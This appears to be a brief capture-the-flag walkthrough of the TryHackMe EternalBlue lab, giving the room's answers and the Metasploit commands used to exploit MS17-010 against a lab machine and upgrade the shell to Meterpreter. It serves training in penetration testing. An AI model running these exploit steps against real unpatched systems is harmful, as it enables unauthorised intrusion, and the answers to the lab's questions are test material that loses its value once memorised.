# Eternal Blue Room - TryHackMe

## Task 1 - Recon

- Scan the machine using NMAP
- How many ports are under 100 -> `3`
- What is this machine vulnerable to -> `ms17-010`

## Task 2 - Gain Access

- Initiate metasploit -> `msfconsole`

- Search for vulnerability -> `search ms17-010`
- Solution -> `exploit/windows/smb/ms17_010_eternalblue`

- Select the exploit that we discover before -> use exploit/xxx
- Run the command -> `show options`
- Solution -> Missing required param `RHOSTS`
- Set the variable -> `set RHOSTS $MACHINE_IP`

- Run the `exploit`

## Task 3 - Escalate

- module to convert shell to meterpreter -> `use post/multi/manage/shell_to_meterpreter`
